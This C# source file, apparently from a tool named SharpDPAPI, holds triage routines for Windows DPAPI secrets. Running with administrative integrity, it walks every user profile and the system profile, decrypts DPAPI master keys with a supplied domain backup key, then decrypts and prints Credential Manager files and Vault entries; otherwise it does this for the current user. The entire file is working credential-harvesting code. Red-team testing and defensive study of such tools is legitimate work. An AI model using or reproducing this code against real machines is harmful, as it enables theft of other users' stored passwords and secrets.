using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace SharpDPAPI
{
    public class Triage
    {
        public static Dictionary<string, string> TriageMasterKeys(byte[] backupKeyBytes, bool show = false)
        {
            Dictionary<string, string> mappings = new Dictionary<string, string>();

            if (Helpers.IsHighIntegrity()) {
                string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                string[] dirs = Directory.GetDirectories(userFolder);
                foreach (string dir in dirs)
                {
                    string[] parts = dir.Split('\\');
                    string userName = parts[parts.Length - 1];
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string userDPAPIBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", dir);
                        if (System.IO.Directory.Exists(userDPAPIBasePath))
                        {
                            string[] directories = Directory.GetDirectories(userDPAPIBasePath);
                            foreach (string directory in directories)
                            {
                                string[] files = Directory.GetFiles(directory);
                                
                                foreach (string file in files)
                                {
                                    if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                    {
                                        string fileName = System.IO.Path.GetFileName(file);
                                        if (show)
                                        {
                                            Console.WriteLine("[*] Found MasterKey : {0}", file);
                                        }

                                        byte[] masteyKeyBytes = File.ReadAllBytes(file);
                                        try
                                        {
                                            Dictionary<string, string> mapping = Dpapi.DecryptMasterKey(masteyKeyBytes, backupKeyBytes);
                                            mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
                                        }
                                        catch (Exception e)
                                        {
                                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                string userName = Environment.GetEnvironmentVariable("USERNAME");
                string userDPAPIBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                if (System.IO.Directory.Exists(userDPAPIBasePath))
                {
                    string[] directories = Directory.GetDirectories(userDPAPIBasePath);
                    foreach (string directory in directories)
                    {
                        string[] files = Directory.GetFiles(directory);
                        
                        foreach (string file in files)
                        {
                            if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                            {
                                string fileName = System.IO.Path.GetFileName(file);
                                if (show)
                                {
                                    Console.WriteLine("[*] Found MasterKey : {0}", file);
                                }

                                byte[] masteyKeyBytes = File.ReadAllBytes(file);
                                try {
                                    Dictionary<string, string> mapping = Dpapi.DecryptMasterKey(masteyKeyBytes, backupKeyBytes);
                                    mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                                }
                            }
                        }
                    }
                }
            }

            return mappings;
        }

        public static void TriageCreds(Dictionary<string, string> MasterKeys)
        {
            // triage all cred files we can reach
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("[*] Triaging Credentials for ALL users\r\n");
                string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    string[] parts = dir.Split('\\');
                    string userName = parts[parts.Length - 1];
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", dir);
                        TriageCredFolder(userCredFilePath, MasterKeys);
                        string userCredFilePath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", dir);
                        TriageCredFolder(userCredFilePath2, MasterKeys);
                    }
                }

                Console.WriteLine("\r\n[*] Triaging System Credentials\r\n");
                string systemFolder = String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot"));
                TriageCredFolder(systemFolder, MasterKeys);
                string systemFolder2 = String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot"));
                TriageCredFolder(systemFolder2, MasterKeys);
            }
            else
            {
                // otherwise just triage the current user's credential folder
                Console.WriteLine("[*] Triaging Credentials for current user\r\n");
                string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                TriageCredFolder(userCredFilePath, MasterKeys);
                string userCredFilePath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                TriageCredFolder(userCredFilePath2, MasterKeys);
            }
        }


        public static void TriageVaults(Dictionary<string, string> MasterKeys)
        {
            // triage all vault folders
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("[*] Triaging Vaults for ALL users\r\n");
                string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    string[] parts = dir.Split('\\');
                    string userName = parts[parts.Length - 1];
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string vaultPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", dir);

                        if (Directory.Exists(vaultPath))
                        {
                            string[] vaultDirs = Directory.GetDirectories(vaultPath);
                            foreach (string vaultDir in vaultDirs)
                            {
                                if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                {
                                    TriageVaultFolder(vaultDir, MasterKeys);
                                }
                            }
                        }

                        string vaultPath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", dir);

                        if (Directory.Exists(vaultPath2))
                        {
                            string[] vaultDirs = Directory.GetDirectories(vaultPath2);
                            foreach (string vaultDir in vaultDirs)
                            {
                                if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                {
                                    TriageVaultFolder(vaultDir, MasterKeys);
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                string vaultPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                if (Directory.Exists(vaultPath))
                {
                    string[] vaultDirs = Directory.GetDirectories(vaultPath);
                    foreach (string vaultDir in vaultDirs)
                    {
                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                        {
                            TriageVaultFolder(vaultDir, MasterKeys);
                        }
                    }
                }

                string vaultPath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                if (Directory.Exists(vaultPath2))
                {
                    string[] vaultDirs = Directory.GetDirectories(vaultPath2);
                    foreach (string vaultDir in vaultDirs)
                    {
                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                        {
                            TriageVaultFolder(vaultDir, MasterKeys);
                        }
                    }
                }
            }
        }

        public static void TriageVaultFolder(string folder, Dictionary<string, string> MasterKeys)
        {
            string policyFilePath = String.Format("{0}\\Policy.vpol", folder);
            if (File.Exists(policyFilePath))
            {
                Console.WriteLine("\r\n[*] Triaging Vault folder: {0}", folder);

                byte[] policyBytes = File.ReadAllBytes(policyFilePath);

                // first try to get vault keys from the Policy.vpol
                ArrayList keys = Dpapi.DescribePolicy(policyBytes, MasterKeys);

                if (keys.Count > 0)
                {
                    // make sure we have keys returned

                    string[] vaultCredFiles = Directory.GetFiles(folder);
                    if ((vaultCredFiles != null) && (vaultCredFiles.Length != 0))
                    {
                        foreach (string vaultCredFile in vaultCredFiles)
                        {
                            string fileName = System.IO.Path.GetFileName(vaultCredFile);
                            if (fileName.EndsWith("vcrd"))
                            {
                                byte[] vaultCredBytes = File.ReadAllBytes(vaultCredFile);

                                try {
                                    Dpapi.DescribeVault(vaultCredBytes, keys);
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[X] Error triaging {0} : {1}", vaultCredFile, e.Message);
                                }
                            }
                        }
                    }
                }
            }
        }

        public static void TriageCredFolder(string folder, Dictionary<string, string> MasterKeys)
        {
            // triage a specific credential folder

            if (System.IO.Directory.Exists(folder))
            {
                string[] systemFiles = Directory.GetFiles(folder);
                if ((systemFiles != null) && (systemFiles.Length != 0))
                {
                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);

                    foreach (string file in systemFiles)
                    {
                        try
                        {
                            TriageCredFile(file, MasterKeys);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                        }
                    }
                }
            }
            else
            {
                // Console.WriteLine("\r\n[X] Folder '{0}' doesn't currently exist!", folder);
            }
        }

        public static void TriageCredFile(string credFilePath, Dictionary<string, string> MasterKeys)
        {
            // triage a specific credential file

            string fileName = System.IO.Path.GetFileName(credFilePath);
            Console.WriteLine("  CredFile           : {0}\r\n", fileName);
            byte[] credentialArray = File.ReadAllBytes(credFilePath);

            // describe and possibly parse the credential blob
            try {
                Dpapi.DescribeCredential(credentialArray, MasterKeys);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Error triaging {0} : {1}", credFilePath, e.Message);
            }
            Console.WriteLine();
        }
    }
}